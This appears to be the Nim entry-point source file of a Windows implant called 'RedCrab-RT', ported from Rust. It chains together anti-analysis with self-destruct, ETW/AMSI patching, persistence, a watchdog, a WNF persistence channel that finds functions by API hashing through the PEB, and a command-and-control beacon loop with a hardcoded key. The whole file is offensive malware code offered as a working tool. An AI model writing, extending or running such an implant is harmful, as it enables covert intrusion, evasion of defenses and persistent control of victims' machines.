# redcrab.nim — RedCrab-RT entry point
#
# Orchestrates all modules: anti-analysis, persistence, C2 beacon,
# post-shutdown WNF channel, watchdog, and sleep obfuscation.
#
# Bug fix from main.rs:80: c2::beacon_loop(&SLEEP_KEY) called a function that
# didn't exist — c2.rs defined `run()` with no parameters.
# Fixed: renamed to beaconLoop(key: array[16, byte]) in c2.nim.

import antidetect, c2, etw_patch, persist, selfdestruct, watchdog
import syscall, post_shutdown

const SLEEP_KEY: array[16, byte] = [
  0x52'u8, 0x65, 0x64, 0x43, 0x72, 0x61, 0x62, 0x52,
  0x54, 0x4B, 0x65, 0x79, 0x30, 0x31, 0x32, 0x33
]

proc WinMain() {.exportc: "WinMain", stdcall.} =
  # 1. Anti-analysis gate
  if antidetect.hostileEnvironment():
    selfdestruct.fullDestruct()

  # 2. ETW / AMSI patching
  etw_patch.patchEtw()

  # 3. Persistence
  persist.install()

  # 4. Start watchdog
  watchdog.start(30_000'u32, 5'u32)

  # 5. WNF persistence channel
  block:
    const H_NTDLL:     uint32 = 0x22D3B5ED'u32
    const H_ADVAPI:    uint32 = 0x67208A49'u32
    const H_SUBSCRIBE: uint32 = 0xC58338BB'u32
    const H_UPDATE:    uint32 = 0xB56BFDD0'u32
    const H_OPEN:      uint32 = 0x074A9772'u32
    const H_SET:       uint32 = 0x34587300'u32
    const H_CLOSE:     uint32 = 0x736B3702'u32

    let fnSubscribe = cast[NtSubscribeWnfFn](getProcFromPeb(H_NTDLL, H_SUBSCRIBE))
    let fnUpdate    = cast[NtUpdateWnfFn](getProcFromPeb(H_NTDLL, H_UPDATE))
    let fnOpen      = cast[RegOpenKeyExWFn](getProcFromPeb(H_ADVAPI, H_OPEN))
    let fnSet       = cast[RegSetValueExWFn](getProcFromPeb(H_ADVAPI, H_SET))
    let fnClose     = cast[RegCloseKeyFn](getProcFromPeb(H_ADVAPI, H_CLOSE))

    if fnSubscribe != nil and fnUpdate != nil and
       fnOpen != nil and fnSet != nil and fnClose != nil:
      discard installWnfChannel(
        @[], SLEEP_KEY,
        fnSubscribe, fnUpdate, fnOpen, fnSet, fnClose)

  # 6. C2 beacon loop — renamed from run() to beaconLoop(key) (bug fix)
  c2.beaconLoop(SLEEP_KEY)

when isMainModule:
  WinMain()
